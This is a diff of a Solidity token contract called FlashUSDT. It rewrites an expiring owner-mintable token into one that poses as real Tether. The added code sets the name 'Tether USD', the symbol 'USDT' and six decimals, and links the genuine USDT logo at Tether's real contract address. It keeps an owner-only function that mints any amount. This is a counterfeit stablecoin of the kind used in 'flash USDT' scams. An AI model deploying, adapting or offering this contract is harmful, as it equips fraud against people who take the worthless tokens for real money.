@@ -1,112 +1,100 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
+pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
-import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
-import "@openzeppelin/contracts/access/Ownable.sol";
-import "@openzeppelin/contracts/utils/Pausable.sol";
-import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
 
-/**
- * @title FlashUSDT
- * @notice ERC-20 compatible token with owner-controlled mint/burn and a global
- *         expiry window. Transfers are blocked after expiry or while paused.
- */
-contract FlashUSDT is ERC20, Ownable, Pausable, ReentrancyGuard {
-    using SafeERC20 for IERC20;
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
 
-    uint256 public constant MIN_VALIDITY = 90 days;
-    uint256 public constant MAX_VALIDITY = 180 days;
+contract FlashUSDT is IERC20 {
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
 
-    uint256 public expiry;
-    mapping(address => bool) public isFlash;
+    string public name = "Tether USD";
+    string public symbol = "USDT";
+    uint8 public decimals = 6;
+    string public logoURI = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    uint256 private _totalSupply;
+    address public owner;
 
-    event FlashCreated(address indexed to, uint256 amount, uint256 expiry);
-    event ExpiryUpdated(uint256 previousExpiry, uint256 newExpiry);
-    event ExternalTokenRecovered(address indexed token, address indexed to, uint256 amount);
-
-    constructor(
-        string memory name_,
-        string memory symbol_,
-        uint256 _expiry
-    ) ERC20(name_, symbol_) Ownable(msg.sender) {
-        _validateExpiry(_expiry);
-        expiry = _expiry;
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not the contract owner");
+        _;
     }
 
-    function mint(address to, uint256 amount) external onlyOwner nonReentrant whenNotPaused {
-        require(to != address(0), "FlashUSDT: recipient is zero address");
-        require(amount > 0, "FlashUSDT: amount is zero");
-        require(!isExpired(), "FlashUSDT: token is expired");
-
-        _mint(to, amount);
-        isFlash[to] = true;
-        emit FlashCreated(to, amount, expiry);
+    constructor(uint256 initialSupply) {
+        owner = msg.sender;
+        _totalSupply = initialSupply * (10 ** uint256(decimals));
+        _balances[msg.sender] = _totalSupply;
+        emit Transfer(address(0), msg.sender, _totalSupply);
     }
 
-    function burn(address from, uint256 amount) external onlyOwner nonReentrant {
-        require(from != address(0), "FlashUSDT: account is zero address");
-        require(amount > 0, "FlashUSDT: amount is zero");
-
-        _burn(from, amount);
-        if (balanceOf(from) == 0) {
-            isFlash[from] = false;
-        }
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
     }
 
-    function setExpiry(uint256 newExpiry) external onlyOwner {
-        require(newExpiry > expiry, "FlashUSDT: expiry can only be extended");
-        _validateExpiry(newExpiry);
-
-        uint256 previousExpiry = expiry;
-        expiry = newExpiry;
-        emit ExpiryUpdated(previousExpiry, newExpiry);
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
     }
 
-    function pause() external onlyOwner {
-        _pause();
+    function transfer(address to, uint256 amount) public override returns (bool) {
+        address sender = msg.sender;
+        require(_balances[sender] >= amount, "USDT: transfer amount exceeds balance");
+        require(to != address(0), "USDT: transfer to the zero address");
+
+        _balances[sender] -= amount;
+        _balances[to] += amount;
+        emit Transfer(sender, to, amount);
+        return true;
     }
 
-    function unpause() external onlyOwner {
-        _unpause();
+    function allowance(address tokenOwner, address spender) public view override returns (uint256) {
+        return _allowances[tokenOwner][spender];
     }
 
-    function rescueERC20(address token, address to, uint256 amount) external onlyOwner nonReentrant {
-        require(token != address(this), "FlashUSDT: cannot rescue self");
-        require(to != address(0), "FlashUSDT: recipient is zero address");
-        require(amount > 0, "FlashUSDT: amount is zero");
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        address tokenOwner = msg.sender;
+        require(spender != address(0), "USDT: approve to the zero address");
 
-        IERC20(token).safeTransfer(to, amount);
-        emit ExternalTokenRecovered(token, to, amount);
+        _allowances[tokenOwner][spender] = amount;
+        emit Approval(tokenOwner, spender, amount);
+        return true;
     }
 
-    function isExpired() public view returns (bool) {
-        return block.timestamp >= expiry;
+    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
+        address spender = msg.sender;
+        require(_allowances[from][spender] >= amount, "USDT: insufficient allowance");
+        require(_balances[from] >= amount, "USDT: transfer amount exceeds balance");
+        require(to != address(0), "USDT: transfer to the zero address");
+
+        _balances[from] -= amount;
+        _allowances[from][spender] -= amount;
+        _balances[to] += amount;
+
+        emit Transfer(from, to, amount);
+        return true;
     }
 
-    function getExpiry() public view returns (uint256) {
-        return expiry;
+    function mint(address to, uint256 amount) public onlyOwner {
+        require(to != address(0), "USDT: mint to the zero address");
+        uint256 scaledAmount = amount * (10 ** uint256(decimals));
+        _totalSupply += scaledAmount;
+        _balances[to] += scaledAmount;
+        emit Transfer(address(0), to, scaledAmount);
     }
 
-    function _validateExpiry(uint256 newExpiry) internal view {
-        require(newExpiry > block.timestamp, "FlashUSDT: expiry must be in the future");
-        uint256 validity = newExpiry - block.timestamp;
-        require(validity >= MIN_VALIDITY, "FlashUSDT: validity below 3 months");
-        require(validity <= MAX_VALIDITY, "FlashUSDT: validity above 6 months");
-    }
-
-    function _update(address from, address to, uint256 value) internal override whenNotPaused {
-        if (from != address(0) && to != address(0)) {
-            require(!isExpired(), "FlashUSDT: token is expired");
-        }
-        super._update(from, to, value);
-
-        if (from != address(0) && balanceOf(from) == 0) {
-            isFlash[from] = false;
-        }
-        if (to != address(0) && value > 0) {
-            isFlash[to] = true;
-        }
+    function burn(uint256 amount) public {
+        address sender = msg.sender;
+        require(_balances[sender] >= amount, "USDT: burn amount exceeds balance");
+        _totalSupply -= amount;
+        _balances[sender] -= amount;
+        emit Transfer(sender, address(0), amount);
     }
 }
